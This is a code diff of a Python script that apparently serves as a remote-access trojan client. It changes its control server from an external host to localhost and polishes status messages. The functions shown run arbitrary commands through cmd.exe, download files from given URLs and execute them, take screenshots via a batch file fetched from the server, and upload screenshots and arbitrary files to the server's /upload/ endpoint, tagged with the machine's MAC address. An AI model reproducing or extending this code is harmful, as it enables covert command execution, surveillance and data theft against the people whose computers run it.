@@ -44,8 +44,8 @@ my_headers.update({
     })
 s = requests.Session()
 
-home_host = 'http://uw471.mikr.us'
-#home_host = 'http://127.0.0.1:8000'
+#home_host = 'http://uw471.mikr.us'
+home_host = 'http://127.0.0.1:8000'
 
 
 """
@@ -129,6 +129,8 @@ def run_command(command, *args):
     s.join(params_list)
     #print(paramlist)
     result = subprocess.run([command, params_list], stdout=subprocess.PIPE)
+    if 'stdout=b\'\'' in str(result):
+        result = 'Command %s executed with no output' % command
     #print(result)
     print('Command executed')
     return result
@@ -151,11 +153,11 @@ def downloader(url, path, *args):
     print('Download completed.')
     if len(args) > 0 and args[0] == 'y':
         run_command(path + '\\' + savefilename)
-        confirmation = 'Downloaded, executed'
+        confirmation = 'File %s downloaded, executed' % url
         return confirmation
     else:
         print('Not requested to run downloaded file.')
-        confirmation = 'Downloaded, not executed'
+        confirmation = 'File %s downloaded, not executed' % url
         return confirmation
 
 
@@ -171,7 +173,7 @@ def popup(text, title):
     r_window = tk.Tk()
     r_window.withdraw()
     messagebox.showinfo(text, title)
-    confirmation = 'Showed'
+    confirmation = 'Messagebox showed'
     return confirmation
 
 
@@ -195,29 +197,28 @@ def screenshot():
     r = s.get(app_url)
     with open(app_dir + 'screenCapture.bat', 'w') as f:
         f.write(r.text)
-    screen_name = (str(time.strftime("%Y%m%d-%H%M%S")) + '_' + (''.join(("%012X" % get_mac())[i:i+2] for i in range(0, 12, 2))))
+    screen_name = (str(time.strftime("%Y%m%d-%H%M%S")) + '_' + det_mac)
     print(screen_name)
     run_command(sys_disk + '\\windows\\system32\\cmd.exe', '/C', 'cd ' + app_dir, '&&', 'screenCapture.bat', screen_name + '.jpg')
-    payload = {
-        'det_mac': det_mac
-    }
-    file = {
-        'file': open(app_dir + screen_name + '.jpg', 'rb')
-    }
-    u = s.post(home_host + '/upload/', files=file, data=payload)
-    print(u.text)
+    fileupload(app_dir + screen_name + '.jpg')
+    confirmation = 'Screenshot %s.jpg uploaded' % screen_name
+    #print(confirmation)
+    return confirmation
 
 
 def fileupload(file_path):
-    payload = {
-        'det_mac': det_mac
-    }
-    file = {
-        'file': open(file_path, 'rb')
-    }
-    u = s.post(home_host + '/upload/', files=file, data=payload)
-    print(u.text)
-    confirmation = 'Uploaded'
+    if os.path.isfile(file_path) == True:
+        payload = {
+            'det_mac': det_mac
+        }
+        file = {
+            'file': open(file_path, 'rb')
+        }
+        u = s.post(home_host + '/upload/', files=file, data=payload)
+        print(u.text)
+        confirmation = 'File %s uploaded' % file_path
+    else:
+        confirmation = 'File %s not exists' % file_path
     return confirmation
 
 
